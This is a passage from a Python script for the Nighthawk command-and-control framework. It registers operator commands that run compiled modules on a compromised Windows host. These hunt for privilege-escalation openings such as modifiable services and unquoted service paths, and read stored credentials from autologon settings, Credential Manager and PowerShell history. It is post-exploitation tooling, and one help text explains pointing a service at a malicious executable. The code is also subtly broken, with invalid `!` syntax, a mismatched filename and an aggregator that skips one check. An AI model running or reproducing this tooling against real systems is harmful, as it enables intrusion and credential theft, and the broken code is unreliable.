    Both keys must be set to 1 for exploitation.
    Usage: always_install_elevated_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "always_install_elevated_check"
)

def autologon_check(params, info):
    """
    Check for stored Autologon credentials in registry.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Construct the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/AutologonCheck/AutologonCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing AutologonCheck BOF")
    api.execute_bof(
        f"AutologonCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    autologon_check,
    "autologon_check",
    "BOF - Check for stored Autologon credentials in registry. (avantguard script)",
    "BOF - Check for stored Autologon credentials in registry. (avantguard script)",
    """autologon_check
    Summary: Checks the Winlogon registry key for stored autologon credentials. If AutoAdminLogon=1 and DefaultPassword is set, credentials are exposed.

    Registry Location:
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Usage: autologon_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "autologon_check"
)

def credential_manager_check(params, info):
    """
    Enumerate credentials from Windows Credential Manager.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/CredentialManagerCheck/CredentialManagerCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing CredentialManagerCheck BOF")
    api.execute_bof(
        f"CredentialManagerCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    credential_manager_check,
    "credential_manager_check",
    "BOF - Enumerate credentials from Windows Credential Manager. (avantguard script)",
    "BOF - Enumerate credentials from Windows Credential Manager. (avantguard script)",
    """credential_manager_check
    Summary: Enumerates all stored credentials in Windows Credential Manager for the current user context.
    Shows target, username, and password.

    Note:
    Only enumerates credentials for the current user/token.
    Running as SYSTEM will not show user credentials.
    Usage: credential_manager_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "credential_manager_check"
)

def hijackable_path_check(params, info):
    """
    Check for writable directories in system PATH.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/HijackablePathCheck/HijackablePathCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing HijackablePathCheck BOF")
    api.execute_bof(
        f"HijackablePathCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    hijackable_path_check,
    "hijackable_path_check",
    "BOF - Check for writable directories in system PATH. (avantguard script)",
    "BOF - Check for writable directories in system PATH. (avantguard script)",
    """hijackable_path_check
    Summary: Enumerates the system PATH environment variable and checks each directory for write permissions. 
    Writable directories in PATH can be abused for DLL hijacking or binary planting.

    Registry Location:
    HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path
    Usage: hijackable_path_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "hijackable_path_check"
)

def modifiable_autorun_check(params, info):
    """
    Check for modifiable autorun executables.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/ModifiableAutorunCheck/ModifiableAutorunCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing ModifiableAutorunCheck BOF")
    api.execute_bof(
        f"ModifiedAutorunCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    modifiable_autorun_check,
    "modifiable_autorun_check",
    "BOF - Check for modifiable autorun executables. (avantguard script)",
    "BOF - Check for modifiable autorun executables. (avantguard script)",
    """modifiable_autorun_check
    Summary: Enumerates autorun registry keys and checks if the referenced executables are writable by the current user.

    Checked Locations:
    HKLM and HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    HKLM and HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM and HKCU:\SOFTWARE\Wow6432Node\...\Run (x64 systems)
    Usage: modifiable_autorun_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "modifiable_autorun_check"
)

def token_privileges_check(params, info):
    """
    Enumerate current token privileges.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/TokenPrivilegesCheck/TokenPrivilegesCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing TokenPrivilegesCheck BOF")
    api.execute_bof(
        f"TokenPrivilegesCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    token_privileges_check,
    "token_privileges_check",
    "BOF - Enumerate current token privileges. (avantguard script)",
    "BOF - Enumerate current token privileges. (avantguard script)",
    """token_privileges_check
    Summary: Enumerates all privileges for the current process token and shows their enabled/disabled status.
    Usage: token_privileges_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "token_privileges_check"
)

def unquoted_svc_path_check(params, info):
    """
    Check for Unquoted Service Paths vulnerability.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/UnquotedSVCPathCheck/UnquotedSVCPathCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing UnquotedSVCPathCheck BOF")
    api.execute_bof(
        f"UnquotedSVCPathCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    unquoted_svc_path_check,
    "unquoted_svc_path_check",
    "BOF - Check for Unquoted Service Paths vulnerability. (avantguard script)",
    "BOF - Check for Unquoted Service Paths vulnerability. (avantguard script)",
    """unquoted_svc_path_check
    Summary: Enumerates Windows services and checks for unquoted paths 
    containing spaces. These can be exploited for privilege escalation.

    Vulnerability Conditions:
    - Service path contains spaces
    - Path is not enclosed in quotes
    - Path is not in System32/SysWOW64
    Usage: unquoted_svc_path_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "unquoted_svc_path_check"
)

def powershell_history_check(params, info):
    """
    Check for PowerShell history file.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/PowerShellHistoryCheck/PowerShellHistoryCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing PowerShellHistoryCheck BOF")
    api.execute_bof(
        f"PowerShellHistoryCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    powershell_history_check,
    "powershell_history_check",
    "BOF - Check for PowerShell history file. (avantguard script)",
    "BOF - Check for PowerShell history file. (avantguard script)",
    """powershell_history_check
    Summary: Checks if the PowerShell PSReadLine history file exists. 
    This file may contain sensitive commands, credentials, or secrets.

    File Location:
    %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    Usage: powershell_history_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "powershell_history_check"
)

def uac_status_check(params, info):
    """
    Check UAC status, integrity level, and admin membership.
    """

    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/UACStatusCheck/UACStatusCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing UACStatusCheck BOF")
    api.execute_bof(
        f"UACStatusCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    uac_status_check,
    "uac_status_check",
    "BOF - Check UAC status, integrity level, and admin membership. (avantguard script)",
    "BOF - Check UAC status, integrity level, and admin membership. (avantguard script)",
    """uac_status_check
    Summary: Checks UAC registry settings, current process integrity level, 
    and local administrator group membership.

    Checks Performed:
    - EnableLUA (UAC enabled/disabled)
    - ConsentPromptBehaviorAdmin (UAC prompt level)
    - PromptOnSecureDesktop
    - Token Integrity Level
    - Local Administrators group membership
    Usage: uac_status_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "uac_status_check"
)

def modifiable_svc_check(params, info):
    """
    Check for services with modifiable permissions.
    """
    
    packer = Packer()
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    # Constructing the path to the BOF file
    bof_path = nighthawk.script_resource(f"bin/PrivCheck/ModifiableSVCCheck/ModifiableSVCCheck.{info.Agent.ProcessArch}.o")
    
    try:
        with open(bof_path, 'rb') as f:
            bof = f.read()
    except FileNotFoundError:
        nighthawk.console_write(CONSOLE_ERROR, f"Could not load BOF file: {bof_path}")
        return

    nighthawk.console_write(CONSOLE_INFO, "executing ModifiableSVCCheck BOF")
    api.execute_bof(
        f"ModifiableSVCCheck.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        show_in_console=True
    )

nighthawk.register_command(
    modifiable_svc_check,
    "modifiable_svc_check",
    "BOF - Check for services with modifiable permissions. (avantguard script)",
    "BOF - Check for services with modifiable permissions. (avantguard script)",
    """modifiable_svc_check
    Summary: Enumerates all Windows services and checks their security
    descriptors to find services that the current user can modify.

    Checked Permissions:
    - SERVICE_CHANGE_CONFIG
    - WRITE_DAC
    - WRITE_OWNER
    - GENERIC_ALL
    - GENERIC_WRITE
    - SERVICE_ALL_ACCESS

    Exploitation:
    If a service is modifiable, you can change its binary path 
    to point to a malicious executable for privilege escalation.
    Usage: modifiable_svc_check

    THIS IS AN AVANTGUARD SCRIPT""",
    "modifiable_svc_check"
)

def priv_check_all(params, info):
    """
    Perform all checks in the PrivCheck BOF collection.
    """
    nighthawk.console_write(CONSOLE_INFO, "executing all checks in PrivCheck BOF collection")

    if !always_install_elevated_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing AlwaysInstallElevated BOF")
        return False
    
    if !autologon_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing Autologon BOF")
        return False
    
    if !credential_manager_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing CredentialManagerCheck BOF")
        return False
    
    if !hijackable_path_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing HijackablePathCheck BOF")
        return False
        
    if !token_privileges_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing TokenPrivilegesCheck BOF")
        return False
        
    if !unquoted_svc_path_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing UnquotedSVCPathCheck BOF")
        return False
        
    if !powershell_history_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing PowerShellHistoryCheck BOF")
        return False

    if !uac_status_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing UACStatusCheck BOF")
        return False

    if !modifiable_svc_check(params, info):
        nighthawk.console_write(CONSOLE_ERROR, f"Error executing ModifiableSVCCheck BOF")
        return False

    nighthawk.console_write(CONSOLE_INFO, "all PrivCheck checks executed successfully")

nighthawk.register_command(
    priv_check_all,
    "priv_check_all",
    "BOF - Perform all checks in the PrivCheck BOF collection. (avantguard script)",
    "BOF - Perform all checks in the PrivCheck BOF collection. (avantguard script)",
    """priv_check_all
    Summary: Performs all checks in the PrivCheck BOF collection.

    Executes all privilege escalation checks in sequence:
    - AlwaysInstallElevatedCheck
    - AutologonCheck
    - CredentialManagerCheck
    - HijackablePathCheck
    - ModifiableAutorunCheck
    - ModifiableSVCCheck
    - TokenPrivilegesCheck
    - UnquotedSVCPathCheck
    - PowerShellHistoryCheck
    - UACStatusCheck

    THIS IS AN AVANTGUARD SCRIPT""",
    "priv_check_all"
)
# endregion